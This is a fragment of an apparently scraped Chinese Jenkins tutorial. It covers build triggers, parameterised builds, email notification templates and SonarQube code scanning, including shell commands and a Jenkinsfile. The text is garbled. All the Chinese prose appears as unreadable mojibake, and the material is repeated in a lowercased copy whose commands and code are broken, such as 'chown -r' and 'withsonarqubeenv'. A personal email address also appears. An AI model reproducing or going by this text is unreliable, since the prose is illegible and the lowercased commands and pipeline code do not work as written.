<li>æå»º&nbsp;&nbsp;Url&nbsp;ï¼&nbsp;\n                    <a href="${BUILD_URL}">${BUILD_URL}</a>\n                </li>\n                <li>å·¥ä½ç®å½&nbsp;ï¼&nbsp;\n                    <a href="${PROJECT_URL}ws">${PROJECT_URL}ws</a>\n                </li>\n                <li>é¡¹ç®&nbsp;&nbsp;Url&nbsp;ï¼&nbsp;\n                    <a href="${PROJECT_URL}">${PROJECT_URL}</a>\n                </li>\n            </ul>\n        </td>\n    </tr>\n    <tr>\n        <td><b><font color="#0B610B">Changes Since Last Successful Build:</font></b>\n            <hr size="2" width="100%" align="center"/>\n        </td>\n    </tr>\n    <tr>\n        <td>\n            <ul>\n                <li>åå²åæ´è®°å½ : <a href="${PROJECT_URL}changes">${PROJECT_URL}changes</a></li>\n            </ul>\n            ${CHANGES_SINCE_LAST_SUCCESS,reverse=true, format="Changes for Build #%n:<br/>%c<br/>",showPaths=true,changesFormat="<pre>[%a]<br/>%m</pre>",pathFormat="&nbsp;&nbsp;&nbsp;&nbsp;%p"}\n        </td>\n    </tr>\n    <tr>\n        <td><b>Failed Test Results</b>\n            <hr size="2" width="100%" align="center"/>\n        </td>\n    </tr>\n    <tr>\n        <td>\n            <pre style="font-size: 11pt; font-family: Tahoma, Arial, Helvetica,sans-serif">\n                $FAILED_TESTS\n            </pre>\n            <br/>\n        </td>\n    </tr>\n    <tr>\n        <td><b><font color="#0B610B">æå»ºæ¥å¿ (æå 100è¡):</font></b>\n            <hr size="2" width="100%" align="center"/>\n        </td>\n    </tr>\n    <tr>\n        <td>\n            <textarea cols="80" rows="30" readonly="readonly"\n                      style="font-family: Courier New">\n                ${BUILD_LOG,maxLines=100}\n            </textarea>\n        </td>\n    </tr>\n</table>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n\n\nè¿éçåæ°é½ä¸º Jenkins çåæ°ï¼å·ä½åæ°å¨ Jenkins ç³»ç»éç½®éå¯ä»¥çå°ï¼ç¹å»å¦ä¸çé®å·å°±è¡ã\n\n\n\n\n\næ·»å  postï¼post æææ¯æå»ºåæä½ï¼post å¯ä»¥æ ¹æ® stage çç»ææ§è¡ä¸åçé»è¾ï¼æ¯å¦ stages éé¢é½æ§è¡å®æï¼ä»ä¼èµ° post éç success ä»£ç ï¼å¦æå¤±è´¥ä¼èµ° failure ä»£ç ãè post çè¯­æ³è¯¥å¦ä½åï¼å¯ä»¥å° æµæ°´çº¿è¯­æ³ ä¸­çå°ã\n\n\n\n * Always run, regardless of build status æ è®ºæå»ºçç»æå¦ä½é½ä¼æ§è¡\n * Run if the build status is "Failure" æå»ºå¤±è´¥è¿è¡\n * Run if the build status is "Success" or hasnt been set yet æå»ºæåè¿è¡\n\nè³äºï¼é®ä»¶çåå®¹ï¼å¯ä»¥å¨çæ®µçæå¨ä¸­æ¥åºæ¥\n\n\n\n    post {\n        always {\n            emailext(\n                # å¯ä»¥ä½¿ç¨ jenkins éé¢çåæ°\n                subject: \'æå»ºéç¥ï¼${PROJECT_NAME} - Build # ${BUILD_NUMBER} - ${BUILD_STATUS}!\',\n                # è¯»å email.html æä»¶\n                body: \'${FILE,path="email.html"}\',\n                # é®ä»¶çæ¶ä»¶äºº\n                to: \'xxxxxx@qq.com\'\n            )\n        }\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n${FILE,path="PATH"} å¯ä»¥å¨ç³»ç»éç½®ä¸­äºè§£\n\n\n\nç¶åå»æå»ºä½ çé¡¹ç®ï¼å°±å¯ä»¥æ¶å° æå»ºé¡¹ç®çé®ä»¶äºã\n\n\n# jenkins éç½® SonarQubeï¼ä»£ç å®¡æ¥ï¼\n\nSonarQube æ¯ä¸ä¸ªç¨äºç®¡çä»£ç è´¨éçå¼æ¾å¹³å°ï¼å¯ä»¥å¿«éçå®ä½ä»£ç ä¸­æ½å¨çæèææ¾çéè¯¯ãç®åæ¯æ java,C#,C/C++,Python,PL/SQL,Cobol,JavaScrip,Groovy ç­äºåå ç§ç¼ç¨è¯­è¨çä»£ç è´¨éç®¡çä¸æ£æµãå®ç½ï¼https://www.sonarqube.org/\n\nè½¯ä»¶          çæ¬\nJDK         1.8\nmysql       8.0\nSonarQube   6.7.4\n\nä¸è½½ sonar åç¼©åï¼https://www.sonarqube.org/downloads/\n\n# è§£å \nunzip sonarqube-6.7.4.zip\n# åå»ºsonarç¨æ·ï¼å¿é¡»sonarç¨äºå¯å¨ï¼å¦åæ¥é\nuseradd sonar \n# æ´æ¹sonarç®å½åæä»¶æé\nchown -R sonar. /opt/software/sonar\n\n\n1\n2\n3\n4\n5\n6\n\n\nä¿®æ¹ sonar éç½®æä»¶\n\nvim /opt/software/sonar/conf/sonar.properties\nsonar.jdbc.username=xxxx\nsonar.jdbc.password=xxxxxx\njdbc:mysql://xxxxxxxxxxx:3306/sonar?useUnicode=true&characterEncoding=utf8&autoReconnect=true&useSSL=false&zeroDateTimeBehavior=convertToNull&&serverTimezone=Asia/Shanghai&rewriteBatchedStatements=true&useConfigs=maxPerformance\n\n\n1\n2\n3\n4\n\n\nå¯å¨ sonar\n\ncd /opt/software/sonar/\n# å¯å¨\nsu sonar ./bin/linux-x86-64/sonar.sh start \n# æ¥çç¶æ\nsu sonar ./bin/linux-x86-64/sonar.sh status \n# åæ­¢\nsu sonar ./bin/linux-x86-64/sonar.sh stop \n# æ¥çæ¥å¿\ntail -f logs/sonar.log\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n> 7.9 ä»¥åä¸æ¯æ mysqlï¼åªæ¯æ h2ãmssqlãpostgresql ï¼7.9 ä»¥ä¸ä¹åªæ¯æ mysql5.7ï¼æä»¥è¿éå°±ä¸å¨ç»§ç»­äºï¼å¤§è´è¯´æ¸æ¥å°±å¥½ï¼å½å®è£å¥½åè®¿é® web é¡µé¢ï¼é»è®¤ 9000 ç«¯å£ï¼å¾å°ä¸ä¸ª token è®°å½ä¸æ¥ã\n\n\n\n1. å¨ Jenkins ä¸­å®è£ SonarQube Scanner æä»¶\n2. å¨ Jenkins->Manager Jenkins->Global Tool Configuration->SonarQube Scanner-> æ°å¢ SonarQube Scanner\n\n1. å¡«å¥ Nameï¼åå­å¯ä»¥èªå·±éä¾¿èµ·\n2. å¾é Install automatically\n3. éæ©å®è£ççæ¬\n4. ç¹å»åºç¨å¹¶ä¿å­\n\n\n1\n2\n3\n4\n\n\n3. å¨ Jenkins->Manager Jenkins->Configure System->SonarQube servers->Add SonarQube\n\n1. å¡«å¥ Nameï¼è¯¥åå­å¯ä»¥éä¾¿èµ·\n2. å¡«åå®è£ SonarQube ç web å°å IP:PORT\n3. æ·»å è¯ä¹¦ï¼è¯¥è¯ä¹¦å°±æ¯è®¿é® SonarQube è·åå°çtokenï¼ä¹å¯ä»¥å¨Jenkinsçå¨å±å­è¯éå»æ·»å è¿ä¸ªè¯ä¹¦ï¼ä½ç±»åéè¦æ¯ Secret text\n4. åºç¨å¹¶ä¿å­\n\n\n1\n2\n3\n4\n\n\n4. éç»ææ§é¡¹ç®æ£æ¥ï¼å°é¡¹ç®éç½®ä¸­æ¾å°æå»ºï¼å¨æ­£å¸¸çæå»ºé¡¹ç®åå½åå¯ä»¥å¢å æå»ºæ­¥éª¤ï¼ç¶ååä¸æéé¡¹ä¸­æ¾å° Execute SonarQube Scanner\n\n1. å¡«åTask to runï¼æ§è¡ SonarQube çå½ä»¤ï¼è¾å¥ scanï¼è§¦åä»£ç æ«æä»¥åæ£æµï¼\n2. ä»£ç éè¦çJDKç¯å¢ï¼è¿ä¸ªJDKç¯å¢æ¯å¨å¨å±éç½®ä¸­éç½®å¾å°ç\n3. å¨ Analysis properties å¡«å¦åå®¹\n\n# must be unique in a given SonarQube instanceï¼é¡¹ç®æ è®°\nsonar.projectKey=web_demo\n# this is the name and version displayed in the SonarQube UI. Was mandatoryprior to SonarQube 6.1.ï¼é¡¹ç®åç§°\nsonar.projectName=web_demo\n# çæ¬\nsonar.projectVersion=1.0\n# Path is relative to the sonar-project.properties file. Replace "\\" by "/" on\nWindows.\n# This property is optional if sonar.modules is set. æ«æä»£ç çè·¯å¾ . ä»£è¡¨å½åé¡¹ç®æ ¹ç®å½ä¸æ«æææä»£ç åæä»¶ï¼ä¹å¯ä»¥ç´æ¥æ«ææå®åä»£ç ï¼å¦ /src/main/**\nsonar.sources=.\n# æé¤çä¸äºæä»¶ä¸æ«æ\nsonar.exclusions=**/test/**,**/target/**\n# jdkçæ¬\nsonar.java.source=1.8\nsonar.java.target=1.8\n# Encoding of the source code. Default is default system encodingï¼ç¼ç æ ¼å¼\nsonar.sourceEncoding=UTF-8\n\n4.åºç¨å¹¶ä¿å­åæå»ºé¡¹ç®\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n\n\n5. æµæ°´çº¿é¡¹ç®æ·»å  SonarQube åè½ï¼å¯ä»¥æåå®¹æ·»å å°é¡¹ç®ä¸­ï¼é²æ­¢ jenkins æå¤çå´©æºï¼å¯¼è´éç½®ä¸¢å¤±\n\n1. å¨é¡¹ç®ä¸­æ ¹è·¯å¾ä¸æ°å»º sonar-project.propertiesï¼å¹¶æåå®¹å¤å¶è¿æ¥\n2. å°é¡¹ç®ä¸­ç Jenkinsfile ä¸­ç¼ååå®¹\n\npipeline {\n    agent any\n\n    stages {\n        stage(\'pull code\') {\n            steps {\n                echo \'master åæ¯çäºæ åæ°æ¯=${branch}\'\n                checkout([$class: \'GitSCM\', branches: [[name: \'*/${branch}\']], extensions: [], userRemoteConfigs: [[credentialsId: \'80dfe5c5-1684-47b1-a410-6f53ceb3c543\', url: \'http://192.168.81.15:3000/biguncle/test.git\']]])\n            }\n        }\n        # ä»£ç æ£æ¥ï¼å¯ä»¥æè¯¥æ­¥éª¤æ·»å å°ä»»æä½ç½®\n        stage(\'code checking\') {\n            steps {\n                script {\n                    # \'\' è¿éåçæ¯å¨jenkins->Global Tool Configuration->SonarQube Scanner->æ°å¢çSonarQube ScannerçName\n                    scannerHome = tool \'sonar-scanner\'\n                }\n                # () éçåå®¹æ¯å¨ jenkins->Configure System->SonarQube servers->éç Name\n                withSonarQubeEnv(\'sonarqube6.7.4\') {\n                    # è¿éæ¯ jenkins å¨éç½® SonarQube Scannerçæ¶åå®è£çå·¥å·ï¼ä»èªå·±å®è£çä¸éè¦æä»¬ç®¡\n                    sh "${scannerHome}/bin/sonar-scanner"\n                }\n            }\n        }\n        stage(\'build project\') {\n            steps {\n                sh \'mvn clean package\'\n            }\n        }\n    }\n    post {\n        always {\n            emailext(\n                subject: \'æå»ºéç¥ï¼${PROJECT_NAME} - Build # ${BUILD_NUMBER} - ${BUILD_STATUS}!\',\n                body: \'${FILE,path="email.html"}\',\n                to: \'875730567@qq.com\'\n            )\n        }\n    }\n}\n\n3. æäº¤åå°±å¯ä»¥å° jenkins å»æå»ºé¡¹ç®ï¼ç»æè¦å» SonarQube web å»ç\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n',normalizedContent:'# åç½®è§¦åå¨\n\njenkins åç½® 4 ç§æå»ºè§¦åå¨ï¼\n\n * è§¦åè¿ç¨æå»ºï¼éè¿ä¸ä¸ªè¿ç¨å°åè§¦åé¡¹ç®çæ§è¡\n * å¶ä»å·¥ç¨æå»ºåè§¦åï¼build after other projects are buildï¼ï¼å°±æ¯éè¦åé¢ä¸ä¸ªé¡¹ç®æå»ºå®æåè§¦åæçé¡¹ç®æå»º\n * å®æ¶æå»ºï¼build periodicallyï¼ï¼é¡¾åæä¹å°±æ¯ ç±»ä¼¼äº corn è¡¨è¾¾å¼ï¼å®æ¶æ§è¡\n * è½®è¯¢ scmï¼poll scmï¼ï¼ä¼å®æ¶æ«ææ¬å°ä»£ç ä»åºæ¯å¦æåæ´ï¼å¦æä»£ç æåæ´å°±è§¦åé¡¹ç®æå»º\n\n\n# è¿ç¨æå»º\n\nå¨é¡¹ç®ä¸­çéç½®ä¸­ï¼æå»ºè§¦åå¨éä¸­è¿ç¨æå»ºã\n\n\n\néè¿æµè§å¨è®¿é® http://192.168.81.102:7777/job/test01/build?token=6666 è¿è¡é¡¹ç®æå»º\n\n\n# å¶ä»å·¥ç¨æå»ºåè§¦å\n\n\n\n\n\nåºç¨ä¿å­åï¼å°±å¯ä»¥æå»º maven_project äºã\n\n\n# å®æ¶æå»º\n\nå®æ¶å­ç¬¦ä¸²ä»å·¦å¾å³åå«ä¸ºï¼ å æ¶ æ¥ æ å¨\nä¸äºå®æ¶è¡¨è¾¾å¼çä¾å­ï¼\n\n# æ¯30åéæå»ºä¸æ¬¡ï¼hä»£è¡¨å½¢å(ä»£è¡¨å°æ¶ï¼æµè¯ç¨ *)\nh/30 * * * * 10:02 10:32\n# æ¯2ä¸ªå°æ¶æå»ºä¸æ¬¡: \nh h/2 * * *\n# æ¯å¤©ç8ç¹ï¼12ç¹ï¼22ç¹ï¼ä¸å¤©æå»º3æ¬¡ï¼ (å¤ä¸ªæ¶é´ç¹ä¸­é´ç¨éå·éå¼) \n0 8,12,22 * * *\n# æ¯å¤©ä¸­å12ç¹å®æ¶æå»ºä¸æ¬¡ \nh 12 * * *\n# æ¯å¤©ä¸å18ç¹å®æ¶æå»ºä¸æ¬¡ \nh 18 * * *\n# å¨æ¯ä¸ªå°æ¶çååä¸ªå°æ¶åçæ¯10åé h(0-29)/10 * * * *\n# æ¯ä¸¤å°æ¶ä¸æ¬¡ï¼æ¯ä¸ªå·¥ä½æ¥ä¸å9ç¹å°ä¸å5ç¹(ä¹è®¸æ¯ä¸å10:38ï¼ä¸å12:38ï¼ä¸å2:38ï¼ä¸å4:38) h h(9-16)/2 * * 1-5\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n\n\n\n# è½®è¯¢ scm\n\nè¯¥æå»ºè§¦åå¨ï¼jenkins ä¼å®æ¶æ«ææ¬å°æ´ä¸ªé¡¹ç®çä»£ç ï¼å¢å¤§ç³»ç»çå¼éï¼ä¸å»ºè®®ä½¿ç¨ã\n\n\n\n\n# git hook èªå¨è§¦åæå»º\n\nå¨ jenkins çåç½®æå»ºè§¦åå¨ä¸­ï¼è½®è¯¢ scm å¯ä»¥å®ç° gitlab ä»£ç æ´æ°ï¼é¡¹ç®èªå¨æå»ºï¼ä½æ¯è¯¥æ¹æ¡çæ§è½ä¸ä½³ãé£ææ²¡ææ´å¥½çæ¹æ¡å¢ï¼ æçãå°±æ¯å©ç¨ gitlab ç webhook å®ç°ä»£ç  push å°ä»åºï¼ç«å³è§¦åé¡¹ç®èªå¨æå»ºã\n\n\n\n\n# å®è£ gitlab hook æä»¶\n\néè¦å®è£ä¸¤ä¸ªæä»¶ï¼gitlab hook å gitlabï¼å®è£å¥½åå¨é¡¹ç®éç½®çæå»ºè§¦åå¨ä¸­ï¼ä¼å¤ä¸ä¸ªéé¡¹\n\n\n\nå³äº gitlab ä¹åçæä½è¯·ç¾åº¦ï¼æè¿éä½¿ç¨çæ¯ giteaã\n\ngitea éè¦ä¸è½½ generic webhook trigger æä»¶ï¼å®è£åå°é¡¹ç®éç½®\n\n\n\n\n\n\n\n\n\néç½®å®æåå°±å¯ä»¥æµè¯äºï¼åªè¦æäº¤äºä»£ç å°±ä¼æå»ºé¡¹ç®ã\n\n\n# jenkins çåæ°åæå»º\n\nææ¶å¨é¡¹ç®æå»ºçè¿ç¨ä¸­ï¼æä»¬éè¦æ ¹æ®ç¨æ·çè¾å¥å¨æä¼ å¥ä¸äºåæ°ï¼ä»èå½±åæ´ä¸ªæå»ºç»æï¼è¿æ¶æä»¬å¯ä»¥ä½¿ç¨åæ°åæå»ºã\n\njenkins æ¯æéå¸¸ä¸°å¯çåæ°ç±»å\n\n\n\n\n# string parameter\n\nè¿æ ·çæ¹å¼åªè½éç¨äº pipeline é¡¹ç®\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nè¿ç§æ¹å¼è¾å¥åªä¸ªåæ¯ï¼å°±æå»ºåªä¸ªåæ¯\n\n\n# éç½®é®ç®±æå¡å¨åéæå»ºç»æ\n\n\n# å®è£ email extension æä»¶\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nå¯ä»¥æµè¯åé\n\n> å¦æ jenkins æ¥éï¼ can\'t send command to smtp host; æå¯è½æ¯ç®¡çåçé®ç®±æ²¡æå¡«åæèåè®¤è¯èçé®ç®±ä¸ç¸åã\n\n\n# åå¤é®ä»¶åå®¹\n\nå¨é¡¹ç®æ ¹ç®å½ç¼å email.htmlï¼å¹¶ææä»¶æ¨é git\n\n<!doctype html>\n<html>\n<head>\n    <meta charset="utf-8">\n    <title>${env, var="job_name"}-ç¬¬${build_number}æ¬¡æå»ºæ¥å¿</title>\n</head>\n<body leftmargin="8" marginwidth="0" topmargin="8" marginheight="4" offset="0">\n<table width="95%" cellpadding="0" cellspacing="0" style="font-size: 11pt; font-family: tahoma, arial, helvetica, sansserif">\n    <tr>\n        <td>(æ¬é®ä»¶æ¯ç¨åºèªå¨ä¸åçï¼è¯·å¿åå¤ï¼)</td>\n    </tr>\n    <tr>\n        <td><h2>\n            <font color="#0000ff">æå»ºç»æ - ${build_status}</font>\n        </h2></td>\n    </tr>\n    <tr>\n        <td><br/>\n            <b><font color="#0b610b">æå»ºä¿¡æ¯</font></b>\n            <hr size="2" width="100%" align="center"/>\n        </td>\n    </tr>\n    <tr>\n        <td>\n            <ul>\n                <li>é¡¹ç®åç§°&nbsp;ï¼&nbsp;${project_name}</li>\n                <li>æå»ºç¼å·&nbsp;ï¼&nbsp;ç¬¬${build_number}æ¬¡æå»º</li>\n                <li>è§¦ååå ï¼&nbsp;${cause}</li>\n                <li>æå»ºæ¥å¿ï¼&nbsp;\n                    <a href="${build_url}console">${build_url}console</a>\n                </li>\n                <li>æå»º&nbsp;&nbsp;url&nbsp;ï¼&nbsp;\n                    <a href="${build_url}">${build_url}</a>\n                </li>\n                <li>å·¥ä½ç®å½&nbsp;ï¼&nbsp;\n                    <a href="${project_url}ws">${project_url}ws</a>\n                </li>\n                <li>é¡¹ç®&nbsp;&nbsp;url&nbsp;ï¼&nbsp;\n                    <a href="${project_url}">${project_url}</a>\n                </li>\n            </ul>\n        </td>\n    </tr>\n    <tr>\n        <td><b><font color="#0b610b">changes since last successful build:</font></b>\n            <hr size="2" width="100%" align="center"/>\n        </td>\n    </tr>\n    <tr>\n        <td>\n            <ul>\n                <li>åå²åæ´è®°å½ : <a href="${project_url}changes">${project_url}changes</a></li>\n            </ul>\n            ${changes_since_last_success,reverse=true, format="changes for build #%n:<br/>%c<br/>",showpaths=true,changesformat="<pre>[%a]<br/>%m</pre>",pathformat="&nbsp;&nbsp;&nbsp;&nbsp;%p"}\n        </td>\n    </tr>\n    <tr>\n        <td><b>failed test results</b>\n            <hr size="2" width="100%" align="center"/>\n        </td>\n    </tr>\n    <tr>\n        <td>\n            <pre style="font-size: 11pt; font-family: tahoma, arial, helvetica,sans-serif">\n                $failed_tests\n            </pre>\n            <br/>\n        </td>\n    </tr>\n    <tr>\n        <td><b><font color="#0b610b">æå»ºæ¥å¿ (æå 100è¡):</font></b>\n            <hr size="2" width="100%" align="center"/>\n        </td>\n    </tr>\n    <tr>\n        <td>\n            <textarea cols="80" rows="30" readonly="readonly"\n                      style="font-family: courier new">\n                ${build_log,maxlines=100}\n            </textarea>\n        </td>\n    </tr>\n</table>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n\n\nè¿éçåæ°é½ä¸º jenkins çåæ°ï¼å·ä½åæ°å¨ jenkins ç³»ç»éç½®éå¯ä»¥çå°ï¼ç¹å»å¦ä¸çé®å·å°±è¡ã\n\n\n\n\n\næ·»å  postï¼post æææ¯æå»ºåæä½ï¼post å¯ä»¥æ ¹æ® stage çç»ææ§è¡ä¸åçé»è¾ï¼æ¯å¦ stages éé¢é½æ§è¡å®æï¼ä»ä¼èµ° post éç success ä»£ç ï¼å¦æå¤±è´¥ä¼èµ° failure ä»£ç ãè post çè¯­æ³è¯¥å¦ä½åï¼å¯ä»¥å° æµæ°´çº¿è¯­æ³ ä¸­çå°ã\n\n\n\n * always run, regardless of build status æ è®ºæå»ºçç»æå¦ä½é½ä¼æ§è¡\n * run if the build status is "failure" æå»ºå¤±è´¥è¿è¡\n * run if the build status is "success" or hasnt been set yet æå»ºæåè¿è¡\n\nè³äºï¼é®ä»¶çåå®¹ï¼å¯ä»¥å¨çæ®µçæå¨ä¸­æ¥åºæ¥\n\n\n\n    post {\n        always {\n            emailext(\n                # å¯ä»¥ä½¿ç¨ jenkins éé¢çåæ°\n                subject: \'æå»ºéç¥ï¼${project_name} - build # ${build_number} - ${build_status}!\',\n                # è¯»å email.html æä»¶\n                body: \'${file,path="email.html"}\',\n                # é®ä»¶çæ¶ä»¶äºº\n                to: \'xxxxxx@qq.com\'\n            )\n        }\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n${file,path="path"} å¯ä»¥å¨ç³»ç»éç½®ä¸­äºè§£\n\n\n\nç¶åå»æå»ºä½ çé¡¹ç®ï¼å°±å¯ä»¥æ¶å° æå»ºé¡¹ç®çé®ä»¶äºã\n\n\n# jenkins éç½® sonarqubeï¼ä»£ç å®¡æ¥ï¼\n\nsonarqube æ¯ä¸ä¸ªç¨äºç®¡çä»£ç è´¨éçå¼æ¾å¹³å°ï¼å¯ä»¥å¿«éçå®ä½ä»£ç ä¸­æ½å¨çæèææ¾çéè¯¯ãç®åæ¯æ java,c#,c/c++,python,pl/sql,cobol,javascrip,groovy ç­äºåå ç§ç¼ç¨è¯­è¨çä»£ç è´¨éç®¡çä¸æ£æµãå®ç½ï¼https://www.sonarqube.org/\n\nè½¯ä»¶          çæ¬\njdk         1.8\nmysql       8.0\nsonarqube   6.7.4\n\nä¸è½½ sonar åç¼©åï¼https://www.sonarqube.org/downloads/\n\n# è§£å \nunzip sonarqube-6.7.4.zip\n# åå»ºsonarç¨æ·ï¼å¿é¡»sonarç¨äºå¯å¨ï¼å¦åæ¥é\nuseradd sonar \n# æ´æ¹sonarç®å½åæä»¶æé\nchown -r sonar. /opt/software/sonar\n\n\n1\n2\n3\n4\n5\n6\n\n\nä¿®æ¹ sonar éç½®æä»¶\n\nvim /opt/software/sonar/conf/sonar.properties\nsonar.jdbc.username=xxxx\nsonar.jdbc.password=xxxxxx\njdbc:mysql://xxxxxxxxxxx:3306/sonar?useunicode=true&characterencoding=utf8&autoreconnect=true&usessl=false&zerodatetimebehavior=converttonull&&servertimezone=asia/shanghai&rewritebatchedstatements=true&useconfigs=maxperformance\n\n\n1\n2\n3\n4\n\n\nå¯å¨ sonar\n\ncd /opt/software/sonar/\n# å¯å¨\nsu sonar ./bin/linux-x86-64/sonar.sh start \n# æ¥çç¶æ\nsu sonar ./bin/linux-x86-64/sonar.sh status \n# åæ­¢\nsu sonar ./bin/linux-x86-64/sonar.sh stop \n# æ¥çæ¥å¿\ntail -f logs/sonar.log\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n> 7.9 ä»¥åä¸æ¯æ mysqlï¼åªæ¯æ h2ãmssqlãpostgresql ï¼7.9 ä»¥ä¸ä¹åªæ¯æ mysql5.7ï¼æä»¥è¿éå°±ä¸å¨ç»§ç»­äºï¼å¤§è´è¯´æ¸æ¥å°±å¥½ï¼å½å®è£å¥½åè®¿é® web é¡µé¢ï¼é»è®¤ 9000 ç«¯å£ï¼å¾å°ä¸ä¸ª token è®°å½ä¸æ¥ã\n\n\n\n1. å¨ jenkins ä¸­å®è£ sonarqube scanner æä»¶\n2. å¨ jenkins->manager jenkins->global tool configuration->sonarqube scanner-> æ°å¢ sonarqube scanner\n\n1. å¡«å¥ nameï¼åå­å¯ä»¥èªå·±éä¾¿èµ·\n2. å¾é install automatically\n3. éæ©å®è£ççæ¬\n4. ç¹å»åºç¨å¹¶ä¿å­\n\n\n1\n2\n3\n4\n\n\n3. å¨ jenkins->manager jenkins->configure system->sonarqube servers->add sonarqube\n\n1. å¡«å¥ nameï¼è¯¥åå­å¯ä»¥éä¾¿èµ·\n2. å¡«åå®è£ sonarqube ç web å°å ip:port\n3. æ·»å è¯ä¹¦ï¼è¯¥è¯ä¹¦å°±æ¯è®¿é® sonarqube è·åå°çtokenï¼ä¹å¯ä»¥å¨jenkinsçå¨å±å­è¯éå»æ·»å è¿ä¸ªè¯ä¹¦ï¼ä½ç±»åéè¦æ¯ secret text\n4. åºç¨å¹¶ä¿å­\n\n\n1\n2\n3\n4\n\n\n4. éç»ææ§é¡¹ç®æ£æ¥ï¼å°é¡¹ç®éç½®ä¸­æ¾å°æå»ºï¼å¨æ­£å¸¸çæå»ºé¡¹ç®åå½åå¯ä»¥å¢å æå»ºæ­¥éª¤ï¼ç¶ååä¸æéé¡¹ä¸­æ¾å° execute sonarqube scanner\n\n1. å¡«åtask to runï¼æ§è¡ sonarqube çå½ä»¤ï¼è¾å¥ scanï¼è§¦åä»£ç æ«æä»¥åæ£æµï¼\n2. ä»£ç éè¦çjdkç¯å¢ï¼è¿ä¸ªjdkç¯å¢æ¯å¨å¨å±éç½®ä¸­éç½®å¾å°ç\n3. å¨ analysis properties å¡«å¦åå®¹\n\n# must be unique in a given sonarqube instanceï¼é¡¹ç®æ è®°\nsonar.projectkey=web_demo\n# this is the name and version displayed in the sonarqube ui. was mandatoryprior to sonarqube 6.1.ï¼é¡¹ç®åç§°\nsonar.projectname=web_demo\n# çæ¬\nsonar.projectversion=1.0\n# path is relative to the sonar-project.properties file. replace "\\" by "/" on\nwindows.\n# this property is optional if sonar.modules is set. æ«æä»£ç çè·¯å¾ . ä»£è¡¨å½åé¡¹ç®æ ¹ç®å½ä¸æ«æææä»£ç åæä»¶ï¼ä¹å¯ä»¥ç´æ¥æ«ææå®åä»£ç ï¼å¦ /src/main/**\nsonar.sources=.\n# æé¤çä¸äºæä»¶ä¸æ«æ\nsonar.exclusions=**/test/**,**/target/**\n# jdkçæ¬\nsonar.java.source=1.8\nsonar.java.target=1.8\n# encoding of the source code. default is default system encodingï¼ç¼ç æ ¼å¼\nsonar.sourceencoding=utf-8\n\n4.åºç¨å¹¶ä¿å­åæå»ºé¡¹ç®\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n\n\n5. æµæ°´çº¿é¡¹ç®æ·»å  sonarqube åè½ï¼å¯ä»¥æåå®¹æ·»å å°é¡¹ç®ä¸­ï¼é²æ­¢ jenkins æå¤çå´©æºï¼å¯¼è´éç½®ä¸¢å¤±\n\n1. å¨é¡¹ç®ä¸­æ ¹è·¯å¾ä¸æ°å»º sonar-project.propertiesï¼å¹¶æåå®¹å¤å¶è¿æ¥\n2. å°é¡¹ç®ä¸­ç jenkinsfile ä¸­ç¼ååå®¹\n\npipeline {\n    agent any\n\n    stages {\n        stage(\'pull code\') {\n            steps {\n                echo \'master åæ¯çäºæ åæ°æ¯=${branch}\'\n                checkout([$class: \'gitscm\', branches: [[name: \'*/${branch}\']], extensions: [], userremoteconfigs: [[credentialsid: \'80dfe5c5-1684-47b1-a410-6f53ceb3c543\', url: \'http://192.168.81.15:3000/biguncle/test.git\']]])\n            }\n        }\n        # ä»£ç æ£æ¥ï¼å¯ä»¥æè¯¥æ­¥éª¤æ·»å å°ä»»æä½ç½®\n        stage(\'code checking\') {\n            steps {\n                script {\n                    # \'\' è¿éåçæ¯å¨jenkins->global tool configuration->sonarqube scanner->æ°å¢çsonarqube scannerçname\n                    scannerhome = tool \'sonar-scanner\'\n                }\n                # () éçåå®¹æ¯å¨ jenkins->configure system->sonarqube servers->éç name\n                withsonarqubeenv(\'sonarqube6.7.4\') {\n                    # è¿éæ¯ jenkins å¨éç½® sonarqube scannerçæ¶åå®è£çå·¥å·ï¼ä»èªå·±å®è£çä¸éè¦æä»¬ç®¡\n                    sh "${scannerhome}/bin/sonar-scanner"\n                }\n            }\n        }\n        stage(\'build project\') {\n            steps {\n                sh \'mvn clean package\'\n            }\n        }\n    }\n    post {\n        always {\n            emailext(\n                subject: \'æå»ºéç¥ï¼${project_name} - build # ${build_number} - ${build_status}!\',\n                body: \'${file,path="email.html"}\',\n                to: \'875730567@qq.com\'\n            )\n        }\n    }\n}\n\n3. æäº¤åå°±å¯ä»¥å° jenkins å»æå»ºé¡¹ç®ï¼ç»æè¦å» sonarqube web 